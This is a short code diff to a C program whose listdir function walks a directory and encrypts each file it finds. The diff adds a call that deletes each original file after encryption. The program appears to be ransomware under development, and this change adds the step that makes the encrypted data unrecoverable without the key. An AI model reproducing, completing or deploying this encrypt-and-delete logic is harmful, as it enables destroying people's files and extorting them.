@@ -5,6 +5,7 @@
 #include <unistd.h> 
 #include <arpa/inet.h>
 #include <openssl/rand.h>
+#include <stdio.h>
 
 
 
@@ -69,6 +70,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             strncat(filePath,dirp->d_name,strlen(dirp->d_name));
             printf("%s\n",filePath);
             encrypt(key, iv, filePath);
+            remove(filePath);
             free(filePath);
             
 
